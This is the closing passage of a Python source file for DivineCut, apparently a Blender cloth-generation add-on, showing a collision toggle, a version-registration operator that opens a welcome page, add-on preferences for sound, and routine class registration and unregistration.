            else:
                bpy.context.object.collision.use = not bpy.context.object.collision.use
                if(bpy.context.object.collision.use == True):
                    bpy.context.window_manager.popup_menu(lambda self, context: self.layout.label(text="Collision Turned On"), title="INFO", icon='CHECKMARK')
                    bpy.ops.object.play_sound(sound_name="Bind.mp3")
                else:
                    bpy.context.window_manager.popup_menu(lambda self, context: self.layout.label(text="Collision Turned Off"), title="INFO", icon='X')
                    bpy.ops.object.play_sound(sound_name="Bind3.mp3")
            if(get_modifier_index('Cloth') is not None):
                bpy.ops.object.modifier_move_to_index(modifier="Collision", index=get_modifier_index('Cloth')+1)
            return{'FINISHED'}

class OBJECT_OT_register_version(bpy.types.Operator):
    bl_idname = "object.register_version"
    bl_label = "Register Version"
    
    
    def execute(self, context):
        if(fetch_button_text(Conscience) == "Granted"):
            bpy.context.preferences.addons["DivineCut"].preferences.registered_version = True
        bpy.ops.wm.save_userpref()
        bpy.ops.object.play_sound(sound_name="Welcome.mp3")
        bpy.ops.wm.url_open(url="https://ffes-hgrl.notion.site/Welcome-to-the-Free-Trial-DivineCut-Smart-Cloth-Generator-for-Blender-6e902ee6ae6b4bc3918d92b20eccde74?pvs=4")
        return{'FINISHED'}

class divineCutPreferences(bpy.types.AddonPreferences):
    bl_idname = __name__
    #bl_idname = "Hello"
    sewingsound: bpy.props.BoolProperty(
        name = "Sound",
        default = False
    )
    sewing_sound_path: bpy.props.StringProperty(
        name = "Divine Cut Folder",
        subtype = "FILE_PATH",
        options = {"LIBRARY_EDITABLE"},
        maxlen = 1024
    )
    
    registered_version : bpy.props.BoolProperty(
        name = "Registered Version",
        default = False,
        options = {'HIDDEN'}
    )
 
    def draw(self, context):
        layout = self.layout
        #layout.label(text='')
        row = layout.row()
        row.prop(self, 'sewingsound', expand=True)
        row = layout.row()
        row.prop(self, 'sewing_sound_path', expand=True)
        row = layout.row()


def register():
    bpy.utils.register_class(divineCutPreferences)
    bpy.utils.register_class(OBJECT_PT_DivinePanel)
    bpy.utils.register_class(OBJECT_OT_open_url_operator)
    bpy.utils.register_class(OBJECT_OT_build_rig)
    bpy.utils.register_class(OBJECT_OT_generate_rig)
    bpy.utils.register_class(OBJECT_OT_generate_rig_trousers)
    bpy.utils.register_class(OBJECT_OT_generate_top)
    bpy.utils.register_class(OBJECT_OT_generate_trousers)
    bpy.utils.register_class(OBJECT_OT_paint_group)
    bpy.utils.register_class(OBJECT_OT_cache_to_bake)
    bpy.utils.register_class(OBJECT_OT_bind_to_character)
    bpy.utils.register_class(OBJECT_OT_hide_bind)
    bpy.utils.register_class(OBJECT_OT_add_button)
    bpy.utils.register_class(OBJECT_OT_add_zip)
    bpy.utils.register_class(OBJECT_OT_add_hoodie)
    bpy.utils.register_class(OBJECT_OT_add_collar)
    bpy.utils.register_class(OBJECT_OT_toggle_seams)
    bpy.utils.register_class(OBJECT_OT_bloat)
    bpy.utils.register_class(OBJECT_OT_shrinkwrap_cuffs)
    bpy.utils.register_class(OBJECT_OT_puffer)
    bpy.utils.register_class(OBJECT_OT_register_divine_object)
    bpy.utils.register_class(OBJECT_OT_turn_to_puffer_jacket)
    bpy.utils.register_class(OBJECT_OT_turn_to_shirt)
    bpy.utils.register_class(OBJECT_OT_turn_to_varsity_jacket)
    bpy.utils.register_class(OBJECT_OT_turn_to_suit_jacket)
    bpy.utils.register_class(OBJECT_OT_play_sound)
    bpy.utils.register_class(OBJECT_OT_set_physics)
    bpy.utils.register_class(OBJECT_OT_emergency_bind)
    bpy.utils.register_class(OBJECT_OT_apply_form)
    bpy.utils.register_class(OBJECT_OT_enable_collar)
    bpy.utils.register_class(OBJECT_OT_trial_ended)
    bpy.utils.register_class(OBJECT_OT_enable_collision)
    bpy.utils.register_class(OBJECT_OT_generate_skirt)
    bpy.utils.register_class(OBJECT_OT_generate_rig_skirt)
    bpy.utils.register_class(OBJECT_OT_bad_connection)
    bpy.utils.register_class(OBJECT_OT_register_version)
    bpy.app.handlers.depsgraph_update_pre.append(on_mode_change)
    bpy.types.Scene.cloth_type = bpy.props.EnumProperty(
        items=[('TOP', 'Top', 'Create a new top for your character'),
               ('TROUSERS', 'Trousers', 'Create new trousers for your character'),
               ('SKIRT', 'Skirt', 'Create a new skirt for your character')],
        name="My Enum Property"
    )
    bpy.types.Scene.bloat_amount_property = bpy.props.FloatProperty(name="Bloat Amount Property", default=0.5, max=1.00, min=0.00)
    bpy.types.Scene.puffpressure_property = bpy.props.FloatProperty(name="Puff Pressure Property", default=1.00, max=1.00, min=0.00)
    bpy.types.Scene.selected_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.cloth_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.character_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.armature_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.button_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.zip_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.puff_object = bpy.props.PointerProperty(type=bpy.types.Object)
    bpy.types.Scene.bindfails = bpy.props.IntProperty(name="Bind Fails", default = 0)
    bpy.types.Scene.cache_start = bpy.props.IntProperty(name="Cache Start", default = 1)
    bpy.types.Scene.previous_mode = bpy.props.StringProperty()
    bpy.types.Scene.seamtool = bpy.props.StringProperty()
    bpy.types.Scene.liveversion = bpy.props.BoolProperty(default=True)
    


def unregister():
    bpy.utils.unregister_class(divineCutPreferences)
    bpy.utils.unregister_class(OBJECT_PT_DivinePanel)
    bpy.utils.unregister_class(OBJECT_OT_open_url_operator)
    bpy.utils.unregister_class(OBJECT_OT_build_rig)
    bpy.utils.unregister_class(OBJECT_OT_generate_rig)
    bpy.utils.unregister_class(OBJECT_OT_generate_rig_trousers)
    bpy.utils.unregister_class(OBJECT_OT_generate_top)
    bpy.utils.unregister_class(OBJECT_OT_generate_trousers)
    bpy.utils.unregister_class(OBJECT_OT_paint_group)
    bpy.utils.unregister_class(OBJECT_OT_cache_to_bake)
    bpy.utils.unregister_class(OBJECT_OT_hide_bind)
    bpy.utils.unregister_class(OBJECT_OT_bind_to_character)
    bpy.utils.unregister_class(OBJECT_OT_add_button)
    bpy.utils.unregister_class(OBJECT_OT_add_zip)
    bpy.utils.unregister_class(OBJECT_OT_add_hoodie)
    bpy.utils.unregister_class(OBJECT_OT_add_collar)
    bpy.utils.unregister_class(OBJECT_OT_toggle_seams)
    bpy.utils.unregister_class(OBJECT_OT_bloat)
    bpy.utils.unregister_class(OBJECT_OT_shrinkwrap_cuffs)
    bpy.utils.unregister_class(OBJECT_OT_puffer)
    bpy.utils.unregister_class(OBJECT_OT_register_divine_object)
    bpy.utils.unregister_class(OBJECT_OT_turn_to_puffer_jacket)
    bpy.utils.unregister_class(OBJECT_OT_turn_to_shirt)
    bpy.utils.unregister_class(OBJECT_OT_turn_to_varsity_jacket)
    bpy.utils.unregister_class(OBJECT_OT_turn_to_suit_jacket)
    bpy.utils.unregister_class(OBJECT_OT_play_sound)
    bpy.utils.unregister_class(OBJECT_OT_set_physics)
    bpy.utils.unregister_class(OBJECT_OT_emergency_bind)
    bpy.utils.unregister_class(OBJECT_OT_apply_form)
    bpy.utils.unregister_class(OBJECT_OT_enable_collar)
    bpy.utils.unregister_class(OBJECT_OT_trial_ended)
    bpy.utils.unregister_class(OBJECT_OT_enable_collision)
    bpy.utils.unregister_class(OBJECT_OT_generate_rig_skirt)
    bpy.utils.unregister_class(OBJECT_OT_generate_skirt)
    bpy.utils.unregister_class(OBJECT_OT_bad_connection)
    bpy.utils.unregister_class(OBJECT_OT_register_version)
    bpy.app.handlers.depsgraph_update_pre.append(on_mode_change)
    del bpy.types.Scene.cloth_type
    del bpy.types.Scene.bloat_amount_property
    del bpy.types.Scene.selected_object
    del bpy.types.Scene.cloth_object
    del bpy.types.Scene.character_object
    del bpy.types.Scene.button_object
    del bpy.types.Scene.zip_object
    del bpy.types.Scene.cache_start
    del bpy.types.Scene.previous_mode
    del bpy.types.Scene.puffpressure_property


if __name__ == "__main__":
    register()